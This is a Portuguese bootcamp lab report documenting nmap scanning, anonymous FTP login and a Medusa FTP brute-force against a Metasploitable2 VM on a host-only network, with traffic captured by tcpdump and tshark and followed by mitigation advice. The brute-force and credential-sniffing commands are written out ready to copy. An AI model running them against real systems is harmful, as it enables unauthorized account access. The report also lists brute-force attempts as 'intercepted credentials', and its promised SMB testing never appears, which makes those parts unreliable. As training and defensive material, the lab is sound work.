# bootcamp_cyber
Kali + Medusa lab: brute‑force FTP/SMB em Metasploitable — evidências e mitigação

Repositório com o laboratório prático do bootcamp: configuração de VMs (Kali + Metasploitable2/DVWA) em VirtualBox (host‑only), execução de ataques de força‑bruta usando Medusa contra serviços (FTP, SMB) e automação de formulários. Inclui wordlists usadas, logs do Medusa, captures (PCAP), screenshots, comandos exatos e um relatório com achados e recomendações de mitigação. Projeto educacional — somente em ambiente controlado.


# Relatório Prático — Bootcamp: Kali + Medusa + Metasploitable2/DVWA

**Autor:** Daniel (trabalho de laboratório)
**Data:** 2025-10-07

---

## Resumo executivo

Documento que compila a sequência de comandos, saídas e evidências geradas durante os testes de força-bruta/enumeração com **Kali Linux** (atacante) e **Metasploitable2/DVWA** (alvo) em VirtualBox com rede host-only. O objetivo foi simular ataques de brute-force em FTP, capturar tráfego e documentar achados e recomendações de mitigação.

---

## Ambiente

* Host: máquina local com VirtualBox
* VMs:

  * **Kali** (atacante) — IP: `192.168.56.102` (eth1)
  * **Metasploitable2/DVWA** (alvo) — IP: `192.168.56.101`
* Rede VirtualBox: **Host-only (eth1)**

---

## Arquivos / pasta do projeto

Local do projeto: `~/bootcamp_medusa`

Conteúdo relevante (listagem no momento do teste):

```
total 56K
-rw-rw-r-- 1 kali kali   27 Oct  7 18:54 base_names.txt
-rw-rw-r-- 1 kali kali   46 Oct  7 18:54 passwords_final.txt
-rw-rw-r-- 1 kali kali 8.0K Oct  7 18:54 passwords_numbers_1000.txt
-rw-rw-r-- 1 kali kali  22K Oct  7 18:54 passwords_rockyou_top2000.txt
-rw-rw-r-- 1 kali kali   46 Oct  7 18:53 passwords.txt
-rw-rw-r-- 1 kali kali   96 Oct  7 18:54 users_combo.txt
-rw-rw-r-- 1 kali kali   96 Oct  7 18:54 users_final.txt
-rw-rw-r-- 1 kali kali   96 Oct  7 18:54 users.txt
```

Contagem de linhas (exemplo):

```
5 /home/kali/bootcamp_medusa/base_names.txt
6 /home/kali/bootcamp_medusa/passwords_final.txt
1000 /home/kali/bootcamp_medusa/passwords_numbers_1000.txt
2000 /home/kali/bootcamp_medusa/passwords_rockyou_top2000.txt
6 /home/kali/bootcamp_medusa/passwords.txt
15 /home/kali/bootcamp_medusa/users_combo.txt
15 /home/kali/bootcamp_medusa/users_final.txt
15 /home/kali/bootcamp_medusa/users.txt
3062 total
```

---

## Sequência de comandos executados (prompts)

Abaixo a sequência exata executada — copie/cole para reproduzir.

### Preparação (criar pasta e listas)

```bash
mkdir -p ~/bootcamp_medusa && cd ~/bootcamp_medusa
cat > users.txt <<'EOF'
admin
root
test
guest
www
EOF

cat > passwords.txt <<'EOF'
password
123456
admin
qwerty
P@ssw0rd
letmein
EOF

# gerar combinações simples para users
cat > base_names.txt <<'EOF'
daniel
maria
joao
luis
ana
EOF
awk '{for(i=1;i<=3;i++) print $0 i}' base_names.txt > users_combo.txt
cat users_combo.txt | sort -u > users.txt
```

### Verificar rede e hosts

```bash
# IP da Kali (eth1)
ip a
# resultado parcial:
# 3: eth1: ... inet 192.168.56.102/24 ...

# descoberta de hosts na rede host-only
sudo nmap -sn 192.168.56.0/24
# saída (resumo): hosts: 192.168.56.1, .100, .101, .102

# scan de portas específicas
sudo nmap -p 21,22,23,80,139,445,3306 --open -oG - 192.168.56.0/24
# resultado (linha relevante):
# Host: 192.168.56.101 () Ports: 21/open/tcp//ftp///, 22/open/tcp//ssh///, 23/open/tcp//telnet///, 80/open/tcp//http///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds///, 3306/open/tcp//mysql///
```

### Criar listas finais (exemplo usado nos testes)

```bash
cat > users_final.txt <<'EOF'
daniel2
ana2
admin
root
test
guest
www
EOF

cat > passwords_final.txt <<'EOF'
123456
password
admin
qwerty
P@ssw0rd
letmein
EOF
```

### Iniciar captura (tcpdump) — em outro terminal

```bash
sudo tcpdump -i eth1 host 192.168.56.101 -w ~/bootcamp_medusa/capture_eth1_$(date +%F_%H%M%S).pcap
# (deixar rodando enquanto executa os testes)
```

### Teste FTP anônimo (interativo)

```bash
ftp 192.168.56.101
# Name: anonymous
# Password: test@example.com
# ls
# bye
```

### Brute-force FTP (Medusa)

```bash
medusa -M ftp -h 192.168.56.101 -U ~/bootcamp_medusa/users_final.txt -P ~/bootcamp_medusa/passwords_final.txt -t 8 -vV |& tee ~/bootcamp_medusa/medusa_ftp_$(date +%F_%H%M%S).log
```

### Parar captura e inspecionar pcap

```bash
# parar tcpdump com Ctrl+C (no terminal do tcpdump)
ls -lh ~/bootcamp_medusa/capture_*.pcap
# inspecionar (exemplo)
tcpdump -r ~/bootcamp_medusa/capture_eth1_2025-10-07_191609.pcap -nn -tt | head -n 80

# extrair comandos/respostas FTP com tshark (gera tabela)
# (requer tshark)

tshark -r ~/bootcamp_medusa/capture_eth1_*.pcap -Y ftp -T fields -e frame.time_epoch -e ip.src -e ip.dst -e ftp.request.command -e ftp.request.arg -e ftp.response.code -e ftp.response.arg > ~/bootcamp_medusa/ftp_traffic_extracted.tsv

# filtrar USER/PASS
grep -iE "USER|PASS" ~/bootcamp_medusa/ftp_traffic_extracted.tsv | sed -n '1,200p' > ~/bootcamp_medusa/ftp_userpass_found.txt
cat ~/bootcamp_medusa/ftp_userpass_found.txt
```

### Evidência: salvar lista anônima do FTP (não interativo)

```bash
ftp -n 192.168.56.101 <<'EOF' > ~/bootcamp_medusa/ftp_anonymous_ls_$(date +%F_%H%M%S).txt 2>&1
user anonymous test@example.com
ls
bye
EOF
```

### Screenshot (terminal)

```bash
gnome-screenshot -w -f ~/bootcamp_medusa/screenshot_terminal_$(date +%F_%H%M%S).png
scrot ~/bootcamp_medusa/screenshot_full_$(date +%F_%H%M%S).png
```

### Compactar evidências

```bash
zip -r bootcamp_medusa_evidences_$(date +%F_%H%M%S).zip *.log *.pcap *.png *.txt
```

---

## Saídas / resultados relevantes (extraídas das capturas e comandos)

### IPs e descoberta de hosts

```
# trecho do `ip a` e nmap
3: eth1: ... inet 192.168.56.102/24 ...
Hosts up (nmap -sn): 192.168.56.1, 192.168.56.100, 192.168.56.101, 192.168.56.102

# portas abertas em 192.168.56.101
21/open/tcp  (ftp)
22/open/tcp  (ssh)
23/open/tcp  (telnet)
80/open/tcp  (http)
139/open/tcp (netbios-ssn)
445/open/tcp (microsoft-ds)
3306/open/tcp (mysql)
```

### Conteúdo dos arquivos criados (head)

```
== users_final.txt ==
daniel2
ana2
admin
root
test
guest
www

== passwords_final.txt ==
123456
password
admin
qwerty
P@ssw0rd
letmein
```

### FTP anônimo — sessão (interativa)

```
Connected to 192.168.56.101.
220 (vsFTPd 2.3.4)
Name (192.168.56.101:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

=> **Login anônimo aceito** (evidência foi salva em `ftp_anonymous_ls_<TIMESTAMP>.txt` quando o comando não interativo foi executado).

### Captura de tráfego (pcap) — comandos FTP e senhas em claro

Trecho extraído do `capture_eth1_2025-10-07_191609.pcap` (tcpdump/tshark):

```
... FTP control frames ...
1759878989.644023 ... FTP: USER daniel2
1759878989.644584 ... FTP: PASS 123456
1759878989.655102 ... FTP: USER daniel2
1759878989.655661 ... FTP: PASS admin
1759878989.657356 ... FTP: PASS password
1759878989.663756 ... FTP: PASS qwerty
1759878989.661884 ... FTP: PASS P@ssw0rd
1759878989.671901 ... FTP: USER ana2
1759878989.672282 ... FTP: PASS 123456
1759878989.673685 ... FTP: PASS password
...
```

Arquivo pcap principal: `~/bootcamp_medusa/capture_eth1_2025-10-07_191609.pcap` (~130K)

Arquivo com pares extraídos: `~/bootcamp_medusa/ftp_userpass_found.txt` (gerado pelo grep/tshark)

**Credenciais interceptadas (extraídas do pcap):**

* daniel2 : 123456
* daniel2 : admin
* daniel2 : password
* daniel2 : qwerty
* daniel2 : P@ssw0rd
* ana2    : 123456
* ana2    : password

> Observação: as credenciais foram capturadas em texto claro durante os testes FTP — evidência direta de tráfego não criptografado.

---

## Interpretação e achados

1. **FTP em texto claro:** vsFTPd respondeu (banner `220 (vsFTPd 2.3.4)`) e o protocolo transmite `USER`/`PASS` em texto simples — capturável por qualquer sniffer na mesma rede.
2. **Login anônimo:** Sessão interativa confirmou `230 Login successful.` para `anonymous` — o servidor permite acesso anônimo.
3. **Força-bruta/automação observada:** Diversas tentativas de `USER`/`PASS` aparecem no pcap (provavelmente geradas pela ferramenta de brute-force utilizada — Medusa/Hydra), contendo combinações das listas usadas.
4. **Evidências salvas:** pcap, arquivos de wordlists, logs (quando gerados) e screenshots.

---

## Recomendações de mitigação (práticas e diretas)

1. **Desabilitar login anônimo** no vsftpd (`anonymous_enable=NO` no `/etc/vsftpd.conf`).
2. **Desativar FTP e usar SFTP/FTPS** (protocolo com criptografia) para evitar exposição de credenciais em texto claro.
3. **Habilitar bloqueio/ratelimit** após N tentativas de login (evita brute-force e password spraying).
4. **Forçar políticas de senha forte** (comprimento mínimo, complexidade) e evitar senhas do tipo `123456`, `password`.
5. **Monitoramento e alertas:** IDS/IPS, correlação de logs para múltiplas falhas de autenticação e alerta em tempo real.
6. **Segmentação de rede:** restringir acesso a serviços críticos (FTP/SMB) apenas para hosts/segmentos necessários.
7. **Snapshots e isolamento:** mantenha o laboratório isolado (host-only) e use snapshots antes dos testes.


